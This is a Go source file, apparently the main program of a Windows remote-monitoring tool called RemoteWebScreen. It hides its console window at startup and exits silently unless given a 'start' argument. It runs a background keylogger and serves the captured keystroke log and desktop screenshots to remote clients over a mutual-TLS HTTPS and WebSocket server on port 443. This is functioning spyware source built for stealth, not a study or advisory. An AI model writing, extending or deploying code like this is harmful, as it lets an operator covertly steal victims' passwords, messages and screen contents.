package main

import (
	"RemoteWebScreen/keyboard"
	"RemoteWebScreen/server"
	"RemoteWebScreen/win32"
	"crypto/tls"
	"crypto/x509"
	"embed"
	"fmt"
	"html/template"
	"io/ioutil"
	"log"
	"net/http"
	"os"
	"path/filepath"
	"time"
	"github.com/gorilla/websocket"
)

//go:embed  index.html static/*
//go:embed certs/server.key certs/server.pem certs/ca.pem
var templates embed.FS

type PageData struct {
	LogContent string
}

func init() {
	win32.HideConsole()
}

func main() {
	listenAddress := ":443"
	if len(os.Args) == 1 {
		os.Exit(0)
	} else if len(os.Args) == 2 && os.Args[1] == "start" {
	} else if len(os.Args) == 3 && os.Args[1] == "start" {
		listenAddress = fmt.Sprintf(":%s", os.Args[2])
	} else {
		os.Exit(0)
	}

	// Load certificates
	certData, err := templates.ReadFile("certs/server.pem")
	if err != nil {
		log.Fatalf("Failed to read server.pem: %v", err)
	}
	keyData, err := templates.ReadFile("certs/server.key")
	if err != nil {
		log.Fatalf("Failed to read server.key: %v", err)
	}
	caCert, err := templates.ReadFile("certs/ca.pem")
	if err != nil {
		log.Fatalf("Failed to read ca.pem: %v", err)
	}
	certPool := x509.NewCertPool()
	certPool.AppendCertsFromPEM(caCert)
	cert, err := tls.X509KeyPair(certData, keyData)
	if err != nil {
		log.Fatalf("Failed to load certificate and key pair: %v", err)
	}

	// Set up TLS configurations
	tlsConfig := &tls.Config{
		Certificates: []tls.Certificate{cert},
		ClientCAs:    certPool,
		ClientAuth:   tls.RequireAndVerifyClientCert,
	}

	// Use the same listener for both HTTPS and WebSocket
	httpsListener, err := tls.Listen("tcp", listenAddress, tlsConfig)
	if err != nil {
		log.Fatalf("Failed to create TLS listener: %v", err)
	}
	fmt.Println("Starting HTTPS and WebSocket server on", listenAddress)

	SimulateDesktopwsPort := listenAddress // Use the same port for WebSocket as well
	go keyboard.Keylog()

	// Define HTTPS handlers
	http.HandleFunc("/"+listenAddress, func(w http.ResponseWriter, r *http.Request) {
		w.Header().Set("Content-Type", "text/html")
		contentBytes, err := templates.ReadFile("index.html")
		if err != nil {
			log.Printf("Error reading index.html: %v", err)
		}
		tmpl, err := template.New("index").Parse(string(contentBytes))
		if err != nil {
			log.Printf("Error parsing index.html: %v", err)
		}
		tmpl.Execute(w, map[string]interface{}{
			"WebSocketPort": SimulateDesktopwsPort,
		})
	})

	// Serve static files
	fs := http.FS(templates)
	http.Handle("/static/", http.StripPrefix("/", http.FileServer(fs)))

	// Log route
	http.HandleFunc("/"+listenAddress+"log", func(w http.ResponseWriter, r *http.Request) {
		filePath := filepath.Join(keyboard.Screen_logPath, keyboard.Logfilename)
		content, err := ioutil.ReadFile(filePath)
		if err != nil {
			log.Printf("Error reading log file: %v", err)
		}
		data := PageData{
			LogContent: string(content),
		}
		tmpl, err := template.New("log").Parse(win32.HtmlTemplate)
		if err != nil {
			log.Printf("Error parsing log template: %v", err)
		}
		err = tmpl.Execute(w, data)
		if err != nil {
			log.Printf("Error executing log template: %v", err)
		}
	})

	http.HandleFunc("/SimulateDesktop", server.ScreenshotHandler)

	// WebSocket handler
	http.HandleFunc("/ws", func(w http.ResponseWriter, r *http.Request) {
		upgrader := websocket.Upgrader{
			CheckOrigin: func(r *http.Request) bool { return true },
		}
		conn, err := upgrader.Upgrade(w, r, nil)
		if err != nil {
			log.Printf("Failed to upgrade WebSocket: %v", err)
			return
		}
		defer conn.Close()

		// WebSocket communication code
		for {
			_, msg, err := conn.ReadMessage()
			if err != nil {
				log.Printf("Error reading WebSocket message: %v", err)
				break
			}
			log.Printf("Received WebSocket message: %s", string(msg))
		}
	})

	// Serve HTTPS (including WebSocket upgrade) on the same port
	if err := http.Serve(httpsListener, nil); err != nil {
		log.Fatalf("Failed to start server: %v", err)
	}

	// Cleanup connections
	go func() {
		ticker := time.NewTicker(30 * time.Second)
		defer ticker.Stop()
		for {
			<-ticker.C
			server.CleanupConnections()
		}
	}()
}
